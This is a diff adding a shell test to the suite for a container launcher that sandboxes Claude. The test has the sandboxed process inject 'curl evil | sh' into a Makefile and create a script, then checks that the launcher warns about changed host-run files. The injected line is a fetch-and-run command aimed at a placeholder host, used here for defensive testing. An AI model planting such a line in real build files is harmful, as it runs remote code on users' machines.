@@ -78,6 +78,15 @@ setup() {
   [ "$status" -eq 0 ]
 }
 
+@test "on exit, the launcher lists the host-run files Claude changed, and keeps its exit code" {
+  echo 'all:' > "$PROJ/Makefile"
+  jail sh -c 'echo "all: ; curl evil | sh" >> Makefile && echo "echo hi" > release.sh && exit 7'
+  [ "$status" -eq 7 ]
+  contains "$output" "Claude changed files that your host runs"
+  grep -qE '^ +changed +Makefile$' <<<"$output"
+  grep -qE '^ +created +release.sh$' <<<"$output"
+}
+
 @test "memory and pids limits are enforced" {
   [ "$(podman info --format '{{.Host.CgroupsVersion}}')" = v2 ] || skip "needs cgroups v2"
   # Rootless podman can only apply limits through systemd, with the memory
